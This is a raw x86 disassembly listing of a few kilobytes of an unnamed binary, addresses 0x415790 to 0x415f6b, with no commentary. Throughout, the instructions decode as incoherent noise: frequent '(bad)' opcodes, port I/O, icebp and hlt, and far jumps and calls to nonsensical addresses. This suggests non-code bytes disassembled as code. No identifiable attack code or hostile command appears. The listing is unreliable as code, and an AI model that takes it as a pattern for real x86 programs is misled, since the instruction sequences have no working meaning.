  415790:	adc    dl,BYTE PTR [eax]
  415792:	xor    al,0xf6
  415794:	adc    DWORD PTR [eax],edi
  415796:	mov    esi,0x4e29ea88
  41579b:	xchg   ecx,eax
  41579c:	xor    al,0xb9
  41579e:	ds jno 0x4157c3
  4157a1:	in     al,0xa4
  4157a3:	xchg   esi,eax
  4157a4:	ficomp WORD PTR gs:[edi-0xa23965]
  4157ab:	pop    esi
  4157ac:	in     al,0xf1
  4157ae:	scas   al,BYTE PTR es:[edi]
  4157af:	call   esp
  4157b1:	jbe    0x4157b9
  4157b3:	lods   eax,DWORD PTR ds:[esi]
  4157b4:	sub    BYTE PTR [edi+0x38],dl
  4157b7:	mov    ah,0xa9
  4157b9:	adc    al,0x38
  4157bb:	adc    BYTE PTR [ecx-0x1c],ah
  4157be:	jns    0x4157fe
  4157c0:	or     DWORD PTR [ecx-0x17],ebx
  4157c3:	xchg   DWORD PTR [eax-0x19],edx
  4157c6:	daa    
  4157c7:	mov    ds:0x6d18ad26,al
  4157cc:	mov    ecx,0x1162b925
  4157d1:	pop    ds
  4157d2:	inc    esp
  4157d3:	nop
  4157d4:	push   ecx
  4157d5:	dec    esi
  4157d6:	cmc    
  4157d7:	jp     0x415829
  4157d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157da:	mov    esp,0x66aaf6f1
  4157df:	fidiv  WORD PTR [ebp+0x225fed49]
  4157e5:	adc    BYTE PTR [edx],al
  4157e7:	mov    cl,BYTE PTR ds:0x150a
  4157ec:	test   ch,bh
  4157ee:	outs   dx,DWORD PTR ds:[esi]
  4157ef:	xchg   ebp,esp
  4157f1:	outs   dx,BYTE PTR ds:[esi]
  4157f2:	pop    esi
  4157f3:	fmul   st,st(0)
  4157f5:	mov    dh,BYTE PTR [edx]
  4157f7:	popf   
  4157f8:	jmp    0xe342ae9e
  4157fd:	mov    bl,BYTE PTR [esi+0x6274ca2b]
  415803:	aaa    
  415804:	lods   eax,DWORD PTR ds:[esi]
  415805:	enter  0xdf,0xa6
  415809:	adc    eax,0x946555bb
  41580e:	push   0x2a
  415810:	pop    ss
  415811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415812:	rol    BYTE PTR [eax+0x55],cl
  415815:	repz inc eax
  415817:	cmp    ch,bl
  415819:	and    DWORD PTR [ebp+edi*1-0x45],ecx
  41581d:	jmp    0x415826
  41581f:	mov    bx,0x3036
  415823:	shl    DWORD PTR [edx+0x2c],0xf3
  415827:	push   esp
  415828:	xchg   esi,eax
  415829:	jmp    0x8983b910
  41582e:	sbb    DWORD PTR [eax-0x4834758f],0x1e4fbcbd
  415838:	mov    ebx,DWORD PTR [edi+ebx*8]
  41583b:	call   0xf16eea50
  415840:	mov    esi,0x9532d53f
  415845:	pop    ds
  415846:	imul   edi,DWORD PTR [esi],0x37
  415849:	(bad)  
  41584a:	or     eax,0x12817da8
  41584f:	mov    ebx,DWORD PTR [ecx+0x6]
  415852:	xor    eax,0x417fdd9b
  415857:	xchg   esi,eax
  415858:	clc    
  415859:	rol    BYTE PTR [ebx],0xa9
  41585c:	pop    eax
  41585d:	aam    0x1
  41585f:	mov    esi,0x8c3f58a9
  415864:	out    0xc7,eax
  415866:	loop   0x415809
  415868:	dec    eax
  415869:	fst    QWORD PTR [esi-0x12]
  41586c:	jmp    0x4158e6
  41586e:	push   0x28525450
  415873:	(bad)  
  415874:	out    0xff,al
  415876:	dec    esi
  415877:	sub    esi,eax
  415879:	ret    
  41587a:	push   ss
  41587b:	fs ins BYTE PTR es:[edi],dx
  41587d:	sahf   
  41587e:	ret    
  41587f:	jecxz  0x41581f
  415881:	sub    al,0x30
  415883:	mov    esp,0x7a2efd7f
  415888:	dec    edx
  415889:	pop    ebx
  41588a:	sub    bh,BYTE PTR [ecx]
  41588c:	xor    al,0x40
  41588e:	icebp  
  41588f:	mov    ebp,0xdcc8c77f
  415894:	or     ch,BYTE PTR [ebx-0x19]
  415897:	into   
  415898:	fwait
  415899:	repz mov esi,DWORD PTR [ecx]
  41589c:	out    0xab,al
  41589e:	inc    edx
  41589f:	pushf  
  4158a0:	clc    
  4158a1:	inc    ecx
  4158a2:	xor    BYTE PTR [ecx],cl
  4158a4:	pop    es
  4158a5:	sub    ch,BYTE PTR [eax-0x32]
  4158a8:	pushf  
  4158a9:	imul   edx,DWORD PTR [esi],0xffffff98
  4158ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158ad:	and    ah,bh
  4158af:	test   DWORD PTR [ebx+0x6b],edx
  4158b2:	sbb    DWORD PTR [ecx-0x73],ecx
  4158b5:	hlt    
  4158b6:	add    eax,0x2773d315
  4158bb:	push   ss
  4158bc:	fstp   st(1)
  4158be:	das    
  4158bf:	(bad)  
  4158c0:	in     al,0xc8
  4158c2:	pop    ecx
  4158c3:	lahf   
  4158c4:	push   cs
  4158c5:	push   ebp
  4158c6:	xchg   ecx,eax
  4158c7:	test   eax,0x504071a3
  4158cc:	(bad)  [edx]
  4158ce:	xchg   esp,eax
  4158cf:	mov    al,ds:0x4224bb58
  4158d4:	mov    esp,0xa0a1c890
  4158d9:	sar    BYTE PTR [ebx+ebp*2-0x78],cl
  4158dd:	daa    
  4158de:	js     0x4158a7
  4158e0:	into   
  4158e1:	push   0x1e
  4158e3:	clc    
  4158e4:	repnz (bad) 
  4158e6:	cmp    DWORD PTR [eax+0x2ded3c57],ecx
  4158ec:	adc    ah,BYTE PTR [ebp-0x7]
  4158ef:	adc    bl,BYTE PTR [eax]
  4158f1:	xor    al,0x48
  4158f3:	pop    edi
  4158f4:	inc    edi
  4158f5:	jo     0x415947
  4158f7:	test   BYTE PTR [eax+eax*8-0x517cb8bd],dh
  4158fe:	jl     0x4158a1
  415900:	shl    ebx,0x87
  415903:	sti    
  415904:	push   0xcc3a9804
  415909:	rcl    DWORD PTR [eax-0x38],0xad
  41590d:	adc    al,0x43
  41590f:	test   ecx,edx
  415911:	fbstp  TBYTE PTR [ecx]
  415913:	xor    al,0x38
  415915:	ret    
  415916:	mov    ah,0x8b
  415918:	imul   esi,DWORD PTR [ecx+edi*8-0x5a],0xffffffb0
  41591d:	push   0x32
  41591f:	out    dx,eax
  415920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415921:	inc    esi
  415922:	stos   BYTE PTR es:[edi],al
  415923:	rol    edi,0xf
  415926:	cmp    ch,bh
  415928:	jnp    0x4159a0
  41592a:	pop    ebp
  41592b:	pop    eax
  41592c:	retf   
  41592d:	jb     0x41594c
  41592f:	fcom   QWORD PTR [edi-0x54]
  415932:	ficomp DWORD PTR [edx-0x19]
  415935:	mov    ch,0x89
  415937:	push   eax
  415938:	dec    edi
  415939:	xchg   DWORD PTR [edi+0x6ec6a050],eax
  41593f:	jnp    0x415937
  415941:	nop
  415942:	jb     0x4158db
  415944:	(bad)  
  415946:	or     cl,BYTE PTR [edx-0x713f4800]
  41594c:	jmp    0x4159ac
  41594e:	cwde   
  41594f:	jl     0x9d0ba34d
  415955:	ja     0x415917
  415957:	cli    
  415958:	jno    0x41593b
  41595a:	test   DWORD PTR [ebp-0x15],0x931b194c
  415961:	out    dx,eax
  415962:	add    al,0x20
  415964:	test   al,0x8e
  415966:	mov    BYTE PTR [esi-0x7ba55081],cl
  41596c:	fwait
  41596d:	and    al,0xc6
  41596f:	lea    esi,[eax-0x48]
  415972:	loope  0x4158fc
  415974:	cmc    
  415975:	cmp    al,BYTE PTR gs:[ecx+ebp*4-0x22539b66]
  41597d:	dec    edx
  41597e:	loope  0x415950
  415980:	fild   QWORD PTR [ebx-0x3518ed26]
  415986:	repz mov al,0xe6
  415989:	imul   eax,DWORD PTR es:[edi+0x5563977],0xdb1f7f37
  415994:	fld    TBYTE PTR [ebp+0x7f73cf3d]
  41599a:	loopne 0x4159e6
  41599c:	sub    edi,DWORD PTR [esi+0x4f985fea]
  4159a2:	and    eax,0xce47109
  4159a7:	(bad)  
  4159a8:	out    0x24,al
  4159aa:	sub    DWORD PTR [edx],0x2f
  4159ad:	push   ss
  4159ae:	add    ebx,DWORD PTR [esi-0x67172758]
  4159b4:	fist   DWORD PTR [edi-0x15a9eef1]
  4159ba:	jecxz  0x41596d
  4159bc:	dec    ecx
  4159bd:	and    eax,DWORD PTR [edi-0x51]
  4159c0:	add    al,0x4b
  4159c2:	cs pop ss
  4159c4:	les    ebx,FWORD PTR [eax+0x7b]
  4159c7:	rol    BYTE PTR [edi+0x63],1
  4159ca:	mov    edi,0x119e1f71
  4159cf:	call   0x9cba:0x28af0b3a
  4159d6:	pop    ebx
  4159d7:	inc    edx
  4159d8:	mov    DWORD PTR [edx-0x7bcd7390],0x81483c39
  4159e2:	outs   dx,DWORD PTR ds:[esi]
  4159e3:	jb     0x415965
  4159e5:	dec    ecx
  4159e6:	js     0x4159e9
  4159e8:	mov    ah,0x4f
  4159ea:	es pusha 
  4159ec:	adc    BYTE PTR [edx+0x9],bl
  4159ef:	enter  0x9fd,0x8
  4159f3:	push   cs
  4159f4:	jns    0x415a5d
  4159f6:	lods   eax,DWORD PTR ds:[esi]
  4159f7:	dec    ebp
  4159f8:	pop    ds
  4159f9:	(bad)  
  4159fa:	sti    
  4159fb:	push   ebp
  4159fc:	push   ds
  4159fd:	and    eax,0xe358cf00
  415a02:	mov    ebx,0x25745ec5
  415a07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a08:	out    0x5c,eax
  415a0a:	out    0xe5,al
  415a0c:	add    eax,0x63c45585
  415a11:	push   0xffffffea
  415a13:	cmp    eax,esi
  415a15:	sahf   
  415a16:	push   ecx
  415a17:	mov    bl,0x25
  415a19:	ss mov bl,0xe6
  415a1c:	adc    bl,dl
  415a1e:	(bad)  
  415a1f:	fcomp  DWORD PTR [edx-0x6c32a349]
  415a25:	and    cl,dh
  415a27:	cld    
  415a28:	enter  0x9e24,0x3f
  415a2c:	jmp    0xc9aa:0x45f6e541
  415a33:	sub    DWORD PTR [edi-0x43],edi
  415a36:	mov    edi,0xfc2e57c7
  415a3b:	test   eax,0xcb705a5
  415a40:	mov    eax,0xcdcea996
  415a45:	adc    dh,bh
  415a47:	and    esi,ebx
  415a49:	fwait
  415a4a:	call   0x56bbede5
  415a4f:	sub    DWORD PTR [esi-0x6f],edi
  415a52:	and    ch,0x31
  415a55:	jg     0x415a23
  415a57:	mov    esi,0x8a530cb3
  415a5c:	shr    BYTE PTR [edx+0x3b],1
  415a5f:	push   0x7c589993
  415a64:	pop    es
  415a65:	ds jg  0x415a30
  415a68:	xor    DWORD PTR [edx+ebx*1+0x1e],eax
  415a6c:	stc    
  415a6d:	es retf 
  415a6f:	out    0x88,eax
  415a71:	xchg   ebx,eax
  415a72:	inc    BYTE PTR ds:0xa388bda0
  415a78:	loopne 0x415a39
  415a7a:	inc    ecx
  415a7b:	fiadd  DWORD PTR [ebx]
  415a7d:	jecxz  0x415a72
  415a7f:	leave  
  415a80:	xor    al,0x0
  415a82:	loope  0x415a05
  415a84:	mov    ds:0xa86180e8,eax
  415a89:	fimul  WORD PTR [esi+0x2a0eb106]
  415a8f:	push   es
  415a90:	and    DWORD PTR [ecx],0x7bec05b7
  415a96:	mov    BYTE PTR [ebp+ebp*8-0x5a],0x5b
  415a9b:	or     al,0xb8
  415a9d:	(bad)  
  415a9e:	repnz mov esp,0x9de93f17
  415aa4:	and    ah,BYTE PTR [edi+0x32]
  415aa7:	push   ss
  415aa8:	push   ecx
  415aa9:	in     al,0x58
  415aab:	fsubr  DWORD PTR [ebp-0x30]
  415aae:	adc    edi,esp
  415ab0:	int    0x95
  415ab2:	inc    ebx
  415ab3:	ucomiss xmm4,DWORD PTR [ebx+0x11]
  415ab7:	aaa    
  415ab8:	pop    esi
  415ab9:	das    
  415aba:	loopne 0x415a99
  415abc:	test   al,0xe7
  415abe:	or     bh,BYTE PTR [edx+edx*8]
  415ac1:	sub    ebx,DWORD PTR [edi-0x5c]
  415ac4:	sahf   
  415ac5:	jns    0x415ad6
  415ac7:	mov    esp,0x63257e05
  415acc:	mov    al,ds:0x1303223f
  415ad1:	das    
  415ad2:	ret    
  415ad3:	stos   DWORD PTR es:[edi],eax
  415ad4:	adc    bl,dh
  415ad6:	popf   
  415ad7:	pop    es
  415ad8:	jbe    0x415a69
  415ada:	mov    al,0x9d
  415adc:	test   DWORD PTR [eax-0x1198388b],0x85d38a03
  415ae6:	stos   BYTE PTR es:[edi],al
  415ae7:	mov    ?,edi
  415ae9:	push   ss
  415aea:	sbb    DWORD PTR ds:0xd4dfff61,esi
  415af0:	cdq    
  415af1:	cmp    bh,BYTE PTR [edi-0x36f9fa24]
  415af7:	xchg   DWORD PTR [eax],esi
  415af9:	mov    esi,ebp
  415afb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415afc:	sbb    cl,ch
  415afe:	rcr    bl,cl
  415b00:	out    0xa5,eax
  415b02:	inc    edx
  415b03:	out    dx,eax
  415b04:	lods   eax,DWORD PTR ds:[esi]
  415b05:	mov    DWORD PTR [eax-0x65d4c3de],eax
  415b0b:	rcr    DWORD PTR [ebp-0x1f],0xd0
  415b0f:	mov    eax,ds:0x9e52d351
  415b14:	dec    eax
  415b15:	aam    0xb4
  415b17:	inc    esi
  415b18:	xor    ebx,DWORD PTR [ebp+0x24]
  415b1b:	sub    al,0x14
  415b1d:	sbb    BYTE PTR [edi],dl
  415b1f:	ret    0xb711
  415b22:	jbe    0x415afe
  415b24:	jne    0x415ac6
  415b26:	stc    
  415b27:	jmp    0xeaacbc33
  415b2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b2d:	cmp    BYTE PTR [ecx+0x6d],ah
  415b30:	cld    
  415b31:	rcr    DWORD PTR [edx-0x398075aa],cl
  415b37:	add    ah,BYTE PTR [esi+ebx*4-0x2320d027]
  415b3e:	loope  0x415b63
  415b40:	jns    0x415b33
  415b42:	addr16 push ds
  415b44:	(bad)  
  415b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b46:	outs   dx,DWORD PTR ds:[esi]
  415b47:	test   al,0x97
  415b49:	mov    ebp,edx
  415b4b:	dec    eax
  415b4c:	inc    edi
  415b4d:	in     al,dx
  415b4e:	or     eax,0xb065a1db
  415b53:	inc    ecx
  415b54:	outs   dx,BYTE PTR ds:[esi]
  415b55:	int    0x7a
  415b57:	and    al,0x21
  415b59:	or     DWORD PTR [edx+ebp*1],0xe912dba9
  415b60:	int    0x3b
  415b62:	add    esi,DWORD PTR [ecx]
  415b64:	dec    ebx
  415b65:	jmp    0x7716:0xbd396583
  415b6c:	aaa    
  415b6d:	lods   al,BYTE PTR ds:[esi]
  415b6e:	sub    BYTE PTR [ecx],0x4c
  415b71:	jae    0x415b40
  415b73:	jae    0x415b98
  415b75:	push   ds
  415b76:	xchg   esi,eax
  415b77:	out    dx,al
  415b78:	int3   
  415b79:	js     0x415b7a
  415b7b:	xchg   ebp,eax
  415b7c:	jmp    0x8558e97d
  415b81:	inc    ebp
  415b82:	bnd jl 0x415bdc
  415b85:	les    edx,FWORD PTR [ebx-0x52]
  415b88:	icebp  
  415b89:	cmp    esp,DWORD PTR [ebx]
  415b8b:	dec    esp
  415b8c:	cdq    
  415b8d:	dec    esi
  415b8e:	inc    edx
  415b8f:	rol    BYTE PTR [esi-0x59a54f94],0xbc
  415b96:	je     0x415bc0
  415b98:	(bad)  
  415b99:	xchg   edi,eax
  415b9a:	push   esi
  415b9b:	push   esp
  415b9c:	int3   
  415b9d:	(bad)  
  415b9e:	into   
  415b9f:	sub    esp,DWORD PTR [eax+edx*2]
  415ba2:	mov    WORD PTR [eax+eax*1],?
  415ba5:	icebp  
  415ba6:	(bad)  
  415ba7:	in     eax,dx
  415ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ba9:	imul   ecx,DWORD PTR [edx-0x441f32d9],0x68
  415bb0:	mov    ebp,eax
  415bb2:	cdq    
  415bb3:	fwait
  415bb4:	lahf   
  415bb5:	test   al,0xf4
  415bb7:	(bad)  
  415bb8:	pop    edx
  415bb9:	dec    ecx
  415bba:	in     eax,dx
  415bbb:	sbb    BYTE PTR [ebx-0x37c6f261],dl
  415bc1:	or     al,0x95
  415bc3:	retf   
  415bc4:	pop    es
  415bc5:	mov    ecx,DWORD PTR [esi-0x6e]
  415bc8:	and    eax,0xb69ee60f
  415bcd:	popf   
  415bce:	push   0x117c200
  415bd3:	pop    edx
  415bd4:	inc    esi
  415bd5:	dec    edx
  415bd6:	mov    cl,0xd
  415bd8:	sbb    BYTE PTR [eax-0x1e],cl
  415bdb:	adc    al,0x5a
  415bdd:	cmc    
  415bde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bdf:	cs aam 0xde
  415be2:	xchg   ebp,eax
  415be3:	in     al,0xd6
  415be5:	add    edx,DWORD PTR [eax-0x133b5a6e]
  415beb:	(bad)  
  415bec:	mov    edx,DWORD PTR [edx-0x78]
  415bef:	xor    eax,DWORD PTR [esi-0x4aba6d28]
  415bf5:	sar    DWORD PTR [edi-0x1c],1
  415bf8:	je     0x415c2c
  415bfa:	test   al,0xc1
  415bfc:	sub    esi,DWORD PTR [ebp+esi*1-0x26a9e715]
  415c03:	pop    esp
  415c04:	sbb    eax,0x4d0bc597
  415c09:	div    cl
  415c0b:	in     eax,dx
  415c0c:	arpl   WORD PTR [edi+0x69],bp
  415c0f:	jle    0x415bac
  415c11:	jno    0x415c52
  415c13:	out    0x6c,eax
  415c15:	xchg   esp,eax
  415c16:	imul   bl
  415c18:	mov    WORD PTR [edi+0x74f3dee3],ss
  415c1e:	mov    ds:0x373f8fcd,eax
  415c23:	adc    al,0x1d
  415c25:	adc    DWORD PTR [edi-0x33f7e6a7],esi
  415c2b:	hlt    
  415c2c:	inc    edx
  415c2d:	shl    BYTE PTR [ebp+0x63a6b529],cl
  415c33:	mov    dh,0x5f
  415c35:	inc    esp
  415c36:	pop    edx
  415c37:	jmp    0xd75804a2
  415c3c:	pop    ecx
  415c3d:	jg     0x415c1e
  415c3f:	cld    
  415c40:	rol    DWORD PTR [edx-0x21],cl
  415c43:	sbb    DWORD PTR [ecx-0x6fd4e8a7],esi
  415c49:	fist   DWORD PTR [edx+0x3eada49f]
  415c4f:	and    al,0x5c
  415c51:	jbe    0x415bda
  415c53:	mov    ah,0x38
  415c55:	retf   0x486b
  415c58:	fld    st(5)
  415c5a:	jg     0x415cbf
  415c5c:	jmp    0xb20ff323
  415c61:	inc    edi
  415c62:	test   eax,0xc46cb630
  415c67:	pop    edx
  415c68:	jmp    0x47b3:0x42c72caf
  415c6f:	mov    fs,WORD PTR [ebx+0x45]
  415c72:	mov    eax,ds:0x92b85295
  415c77:	mov    cl,0x7e
  415c79:	mov    dl,0x25
  415c7b:	mov    ebp,0xbb32a6cd
  415c80:	test   al,0xd4
  415c82:	enter  0xf7ab,0x26
  415c86:	jecxz  0x415c6f
  415c88:	mov    edi,0x4dfc509a
  415c8d:	sbb    al,0x39
  415c8f:	jno    0x415c88
  415c91:	mov    esi,0xdeee7be8
  415c96:	mov    WORD PTR [edx],?
  415c98:	cdq    
  415c99:	adc    ebx,edx
  415c9b:	test   DWORD PTR [ebx+0x12fdf65f],esp
  415ca1:	ds fwait
  415ca3:	xor    BYTE PTR [eax-0x595d87dd],0x66
  415caa:	jl     0x415c7f
  415cac:	or     al,0xdd
  415cae:	test   DWORD PTR [ebx+edx*1],esi
  415cb1:	cld    
  415cb2:	dec    edx
  415cb3:	leave  
  415cb4:	in     eax,dx
  415cb5:	push   edi
  415cb6:	pop    eax
  415cb7:	xor    al,0x8d
  415cb9:	lahf   
  415cba:	jnp    0x415d39
  415cbc:	pop    ebp
  415cbd:	sub    al,0x2f
  415cbf:	out    dx,al
  415cc0:	call   0x9a55:0xa5bf0ab1
  415cc7:	push   ebx
  415cc8:	mov    ds:0x8993fc3f,al
  415ccd:	mov    edx,0xd8a49c8d
  415cd2:	xor    edx,0x65
  415cd5:	mov    eax,ds:0xd9f0db00
  415cda:	xchg   ebx,eax
  415cdb:	rcr    BYTE PTR [ebx],cl
  415cdd:	pop    eax
  415cde:	dec    ecx
  415cdf:	das    
  415ce0:	jno    0x415cce
  415ce2:	add    ebp,DWORD PTR [esi-0x3e7dda66]
  415ce8:	repnz shl BYTE PTR ss:[ebx+ebx*2-0x40],1
  415cee:	ret    
  415cef:	arpl   WORD PTR [edx+eax*2-0x76],di
  415cf3:	shl    bh,0xea
  415cf6:	xor    edi,ecx
  415cf8:	push   cs
  415cf9:	lea    ebp,[ebp+0x7d]
  415cfc:	rcr    BYTE PTR [eax],cl
  415cfe:	fmul   DWORD PTR [ecx+0x1a]
  415d01:	add    al,0xb5
  415d03:	int    0xbe
  415d05:	aaa    
  415d06:	repnz arpl WORD PTR cs:[edi-0x3a5d4e84],bx
  415d0e:	out    dx,al
  415d0f:	imul   edi,ebx,0x372471cf
  415d15:	lds    ebp,FWORD PTR [ebx+0xe]
  415d18:	div    DWORD PTR [esi-0x4c]
  415d1b:	jo     0x415ceb
  415d1d:	sub    al,0x66
  415d1f:	and    bh,BYTE PTR [ebp+0x59640608]
  415d25:	mov    edx,0xf53d720a
  415d2a:	xor    dl,dh
  415d2c:	retf   
  415d2d:	xchg   ebx,eax
  415d2e:	out    dx,eax
  415d2f:	pop    eax
  415d30:	iret   
  415d31:	and    eax,0x54761b8b
  415d36:	test   eax,0x6e77483f
  415d3b:	xor    al,0x19
  415d3d:	pop    ebx
  415d3e:	push   0x4ca2d841
  415d43:	pusha  
  415d44:	add    al,al
  415d46:	and    ch,ah
  415d48:	inc    edi
  415d49:	aam    0x74
  415d4b:	ins    DWORD PTR es:[edi],dx
  415d4c:	ret    
  415d4d:	jns    0x415cf5
  415d4f:	icebp  
  415d50:	and    DWORD PTR ds:0x385f2390,edi
  415d56:	cmp    eax,esi
  415d58:	enter  0x5a0,0x7e
  415d5c:	mov    ecx,0xee955291
  415d61:	adc    dl,BYTE PTR [eax+0x30]
  415d64:	and    DWORD PTR [edx],0x77599434
  415d6a:	add    al,0xb1
  415d6c:	dec    esp
  415d6d:	sbb    DWORD PTR [eax+ecx*1],0xb7fdd4c7
  415d74:	or     al,0xe1
  415d76:	aad    0x4f
  415d78:	jmp    0xc0b0:0x2b23f6b4
  415d7f:	call   0xacc2e9b2
  415d84:	scas   eax,DWORD PTR es:[edi]
  415d85:	mov    eax,0x6f0cd81d
  415d8a:	jmp    0x20a35959
  415d8f:	inc    edx
  415d90:	xchg   edx,eax
  415d91:	adc    BYTE PTR [esi-0x7a989303],bh
  415d97:	test   DWORD PTR [ecx+eax*8],0xcc7b87df
  415d9e:	scas   al,BYTE PTR es:[edi]
  415d9f:	push   cs
  415da0:	hlt    
  415da1:	test   ebp,ecx
  415da3:	adc    BYTE PTR [esi+0x777e38ea],cl
  415da9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415daa:	pop    edx
  415dab:	and    cl,BYTE PTR [ebp-0x35031068]
  415db1:	or     DWORD PTR [esi],ebx
  415db3:	jg     0x415dde
  415db5:	cld    
  415db6:	in     al,0xee
  415db8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415db9:	xor    esp,edx
  415dbb:	hlt    
  415dbc:	sub    BYTE PTR [edx-0x4bc9a7d7],bl
  415dc2:	dec    ebp
  415dc3:	jne    0x415e14
  415dc5:	adc    al,0x49
  415dc7:	(bad)  
  415dc8:	in     eax,dx
  415dc9:	add    DWORD PTR [ecx+0x1a3828de],edx
  415dcf:	add    BYTE PTR [esi-0x38907f11],0xa2
  415dd6:	xchg   ebx,eax
  415dd7:	mov    eax,ds:0x88f99a62
  415ddc:	shl    BYTE PTR [esi-0x643b77be],1
  415de2:	jae    0x415d99
  415de4:	pop    esi
  415de5:	or     al,0x70
  415de7:	jmp    0x5c6a:0x1e1735d3
  415dee:	arpl   bx,bx
  415df0:	mov    al,0x40
  415df2:	ins    BYTE PTR es:[edi],dx
  415df3:	(bad)
  415df6:	fdivr  DWORD PTR [eax]
  415df8:	mov    esi,?
  415dfa:	sub    cl,BYTE PTR [ebp-0x35]
  415dfd:	fsub   st(0),st
  415dff:	mov    esp,0xb4a7e363
  415e04:	jecxz  0x415da8
  415e06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e07:	mov    eax,0x4fd9b3d3
  415e0c:	or     ebp,0x5b84f7f7
  415e12:	add    BYTE PTR [ebx+0xe392335],dl
  415e18:	loop   0x415e60
  415e1a:	mov    edx,0xf995a5a3
  415e1f:	adc    eax,0xabc68110
  415e24:	xor    DWORD PTR [ebx+0x7f],ebx
  415e27:	retf   0x8718
  415e2a:	add    BYTE PTR [ecx],bh
  415e2c:	es xchg ecx,eax
  415e2e:	mov    ah,0x85
  415e30:	fsub   QWORD PTR [esi]
  415e32:	inc    esi
  415e33:	and    eax,0x5240f0f2
  415e38:	int    0x4f
  415e3a:	aam    0xb0
  415e3c:	dec    edx
  415e3d:	fs in  al,0x6b
  415e40:	sub    eax,0x513fadd5
  415e45:	push   ebx
  415e46:	pop    esi
  415e47:	adc    BYTE PTR [edi],bl
  415e49:	and    DWORD PTR [ecx],0xffffffa0
  415e4c:	stos   DWORD PTR es:[edi],eax
  415e4d:	fisubr WORD PTR [eiz*8-0x178149dd]
  415e54:	add    edx,DWORD PTR [esi+eax*4+0x70]
  415e58:	xchg   ebp,eax
  415e59:	add    DWORD PTR [eax+ebx*8-0x36765365],esp
  415e60:	mov    ah,0x51
  415e62:	cmp    BYTE PTR [eax],bl
  415e64:	stos   BYTE PTR es:[edi],al
  415e65:	xor    BYTE PTR [ebx+0x5],0x6b
  415e69:	sbb    edi,eax
  415e6b:	xchg   ebp,eax
  415e6c:	inc    ebp
  415e6d:	sbb    al,0x38
  415e6f:	stos   DWORD PTR es:[edi],eax
  415e70:	mov    esi,0xeb11faee
  415e75:	cwde   
  415e76:	(bad)  
  415e77:	dec    ebx
  415e78:	mov    ah,0x5c
  415e7a:	xchg   BYTE PTR [edx-0x10],ch
  415e7d:	dec    ebp
  415e7e:	mov    eax,0xd5c8bdc9
  415e83:	(bad)  
  415e84:	jg     0x415e10
  415e86:	cli    
  415e87:	mov    ebx,0xfc5309bf
  415e8c:	ss ja  0x415ef8
  415e8f:	push   ds
  415e90:	bnd jae 0x415e73
  415e93:	sbb    dl,BYTE PTR [ecx+0x369a43fd]
  415e99:	jle    0x415e4e
  415e9b:	loop   0x415ef9
  415e9d:	fs mov ebx,0x252bee7f
  415ea3:	inc    ebp
  415ea4:	pcmpeqw mm7,QWORD PTR [ecx+0x68]
  415ea8:	or     DWORD PTR [esi-0x45],ebx
  415eab:	nop
  415eac:	stos   DWORD PTR es:[edi],eax
  415ead:	popa   
  415eae:	xchg   ecx,eax
  415eaf:	mov    al,0xbf
  415eb1:	dec    edx
  415eb2:	sbb    edi,edx
  415eb4:	mov    edx,0xb7a4c85e
  415eb9:	pop    es
  415eba:	test   BYTE PTR [eax],0xaf
  415ebd:	jo     0x415e55
  415ebf:	xor    cl,BYTE PTR [ecx+0xa]
  415ec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ec3:	loop   0x415eba
  415ec5:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  415ec7:	jecxz  0x415f37
  415ec9:	mov    ebx,0xf0820f55
  415ece:	or     DWORD PTR [ebx+0x6753480d],esi
  415ed4:	mov    eax,0xff83cce
  415ed9:	inc    ebx
  415eda:	(bad)  
  415edb:	dec    eax
  415edc:	enter  0xc0f5,0xd2
  415ee0:	xrelease mov BYTE PTR [ebp+0x2b084390],bl
  415ee7:	xor    BYTE PTR [ebx],ch
  415ee9:	and    DWORD PTR [ecx],ebx
  415eeb:	xchg   ebx,eax
  415eec:	stos   BYTE PTR es:[edi],al
  415eed:	dec    ebx
  415eee:	call   DWORD PTR [esi+0x51bd678a]
  415ef4:	push   ecx
  415ef5:	pushf  
  415ef6:	push   cs
  415ef7:	call   0x68bead37
  415efc:	or     al,0xfd
  415efe:	mov    ds:0x39cb2a32,al
  415f03:	xor    al,0xd3
  415f05:	xchg   DWORD PTR ds:0xcceb4dd0,eax
  415f0b:	jge    0x415f78
  415f0d:	jmp    FWORD PTR [ebp-0x14]
  415f10:	mov    eax,ds:0x1aed6e42
  415f15:	xor    BYTE PTR [edi],al
  415f17:	jb     0x415f33
  415f19:	jmp    0x415f08
  415f1b:	xor    DWORD PTR [edi+0x51],esi
  415f1e:	push   cs
  415f1f:	add    dl,BYTE PTR [esi-0x2a]
  415f22:	add    eax,0x94e7fafc
  415f27:	leave  
  415f28:	mov    bh,0x6
  415f2a:	mov    ebp,0x51f09cf0
  415f2f:	fimul  WORD PTR [eax-0x21]
  415f32:	std    
  415f33:	jg     0x415f5f
  415f35:	(bad)  
  415f37:	out    dx,eax
  415f38:	cwde   
  415f39:	mov    al,0x27
  415f3b:	ss sbb bh,ch
  415f3e:	and    BYTE PTR [ebp+0x3ad16490],al
  415f44:	sbb    ebx,eax
  415f46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f47:	lock (bad) 
  415f49:	test   DWORD PTR [ecx],ebp
  415f4b:	push   ebp
  415f4c:	dec    edx
  415f4d:	mov    al,BYTE PTR [ebx+0x37]
  415f50:	lahf   
  415f51:	mov    ebx,?
  415f53:	dec    eax
  415f54:	repz add al,ah
  415f57:	jl     0x415f14
  415f59:	ret    0x5636
  415f5c:	sbb    cl,BYTE PTR [esi]
  415f5e:	jg     0x415f0c
  415f60:	popa   
  415f61:	sbb    edi,DWORD PTR [edx+0x57bb388]
  415f67:	pop    edi
  415f68:	xchg   DWORD PTR [ebx],edx
  415f6a:	push   ss
  415f6b:	and    al,0x61
